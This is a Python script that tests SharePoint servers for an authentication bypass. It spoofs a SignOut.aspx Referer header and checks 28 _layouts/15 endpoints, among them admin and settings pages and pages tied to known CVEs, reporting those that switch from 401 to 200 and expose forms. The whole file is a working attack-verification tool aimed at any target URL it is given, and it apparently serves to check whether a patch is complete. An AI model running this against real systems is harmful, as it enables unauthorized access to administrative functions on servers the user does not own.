#!/usr/bin/env python3
"""
Verify if the 28 endpoints with 200 OK are real authentication bypasses
or just whitelisted error/dialog pages.

Test criteria:
1. Check if page requires authentication without signout Referer
2. Check response content for error messages vs functional content
3. Test if page accepts and processes POST parameters
4. Determine if this represents a real authentication bypass
"""

import requests
import argparse

def verify_bypass_route(base_url, endpoint):
    """
    Verify if endpoint is a real bypass or just whitelisted page

    Returns: (is_bypass, evidence)
    """
    print(f"\n{'='*80}")
    print(f"[*] Verifying: {endpoint}")
    print(f"{'='*80}")

    # Test 1: Access WITHOUT signout Referer (normal request)
    print("\n[Test 1] Normal request (no signout Referer)")
    headers_normal = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }

    try:
        r1 = requests.post(f"{base_url}{endpoint}", headers=headers_normal, data="", allow_redirects=False, timeout=10)
        print(f"    Status: {r1.status_code}")

        # Test 2: Access WITH signout Referer
        print("\n[Test 2] Request WITH signout Referer")
        headers_signout = headers_normal.copy()
        headers_signout["Referer"] = "/_layouts/SignOut.aspx"

        r2 = requests.post(f"{base_url}{endpoint}", headers=headers_signout, data="", allow_redirects=False, timeout=10)
        print(f"    Status: {r2.status_code}")

        # Analysis
        print("\n[Analysis]")

        # Check if signout Referer changes the response
        if r1.status_code == 401 and r2.status_code == 200:
            print("    [!] CONFIRMED BYPASS: 401 → 200 with signout Referer")

            # Check response content
            body_lower = r2.text.lower()
            if "error" in body_lower or "exception" in body_lower:
                print("    [~] Response contains error/exception text")
                print(f"    Body snippet: {r2.text[:300]}")
                return (False, "Error page - not a functional bypass")
            else:
                print("    [+] Response does NOT contain obvious error indicators")
                # Check for functional content
                if any(indicator in body_lower for indicator in ["form", "input", "postback", "viewstate", "__viewstate"]):
                    print("    [+] Page contains forms/inputs - likely functional")
                    return (True, "Functional page with forms - REAL BYPASS")
                else:
                    print("    [?] Page structure unclear - needs manual inspection")
                    print(f"    Body snippet: {r2.text[:300]}")
                    return (False, "Unclear - needs manual inspection")

        elif r1.status_code == r2.status_code == 200:
            print("    [-] Page accessible both WITH and WITHOUT signout Referer")
            print("    [-] This is a PUBLIC page, not a bypass")
            return (False, "Public page - not a bypass")

        elif r1.status_code == r2.status_code == 401:
            print("    [-] Both requests require authentication")
            print("    [-] Signout Referer does NOT bypass authentication here")
            return (False, "Authentication required - not a bypass")

        else:
            print(f"    [?] Unexpected behavior: {r1.status_code} → {r2.status_code}")
            return (False, "Unexpected behavior")

    except Exception as e:
        print(f"    [!] Error: {str(e)[:100]}")
        return (False, f"Test failed: {str(e)[:50]}")

def main():
    parser = argparse.ArgumentParser(description="Verify bypass routes")
    parser.add_argument("--url", required=True, help="Target URL")
    args = parser.parse_args()

    base_url = args.url.rstrip('/')

    # List of endpoints that returned 200 OK with signout Referer
    potential_bypasses = [
        "/_layouts/15/ToolPicker.aspx",
        "/_layouts/15/ToolPart.aspx",
        "/_layouts/15/AdminTools.aspx",
        "/_layouts/15/SiteSettings.aspx",
        "/_layouts/15/ListEdit.aspx",
        "/_layouts/15/WebPartAdder.aspx",
        "/_layouts/15/WebPartGallery.aspx",
        "/_layouts/15/EditWebPart.aspx",
        "/_layouts/15/WPPicker.aspx",
        "/_layouts/15/Picker.aspx",  # CVE-2019-0604 endpoint
        "/_layouts/15/PickerDialog.aspx",
        "/_layouts/15/ItemPicker.aspx",
        "/_layouts/15/EntityPicker.aspx",
        "/_layouts/15/PeoplePicker.aspx",
        "/_layouts/15/InfoPathForm.aspx",
        "/_layouts/15/DialogMaster.aspx",
        "/_layouts/15/SimpleForm.aspx",
        "/_layouts/15/FieldEdit.aspx",
        "/_layouts/15/UploadMultiple.aspx",
        "/_layouts/15/NewForm.aspx",
        "/_layouts/15/EditForm.aspx",
        "/_layouts/15/DispForm.aspx",
        "/_layouts/15/quicklinksdialogform.aspx",  # CVE-2020-1147 endpoint
        "/_layouts/15/QuickLinksDialog.aspx",
        "/_layouts/15/ContactLinksSuggestionsMicroView.aspx",  # CVE-2020-1147 endpoint
        "/_layouts/15/RedirectPage.aspx",
        "/_layouts/15/listedit.aspx",
        "/_layouts/15/CustomizePage.aspx",
    ]

    print("[*] BYPASS ROUTE VERIFICATION")
    print(f"[*] Testing {len(potential_bypasses)} endpoints")
    print("="*80)

    confirmed_bypasses = []
    unclear_cases = []
    false_positives = []

    for endpoint in potential_bypasses:
        is_bypass, evidence = verify_bypass_route(base_url, endpoint)

        if is_bypass:
            confirmed_bypasses.append((endpoint, evidence))
        elif "Unclear" in evidence or "manual" in evidence.lower():
            unclear_cases.append((endpoint, evidence))
        else:
            false_positives.append((endpoint, evidence))

    # Summary
    print("\n" + "="*80)
    print("[*] VERIFICATION COMPLETE")
    print("="*80)

    print(f"\n[+] CONFIRMED BYPASSES: {len(confirmed_bypasses)}")
    for endpoint, evidence in confirmed_bypasses:
        print(f"    - {endpoint}")
        print(f"      Evidence: {evidence}")

    print(f"\n[?] UNCLEAR CASES (manual inspection needed): {len(unclear_cases)}")
    for endpoint, evidence in unclear_cases:
        print(f"    - {endpoint}")
        print(f"      Reason: {evidence}")

    print(f"\n[-] FALSE POSITIVES: {len(false_positives)}")
    for endpoint, evidence in false_positives:
        print(f"    - {endpoint}")
        print(f"      Reason: {evidence}")

    if confirmed_bypasses:
        print("\n[!] CRITICAL: Confirmed authentication bypass routes found!")
        print("[!] The patch is INCOMPLETE - it only fixed ToolPane.aspx")
    else:
        print("\n[+] No confirmed bypasses found")
        print("[+] The 28 endpoints are likely whitelisted pages (error dialogs, etc.)")

if __name__ == "__main__":
    main()
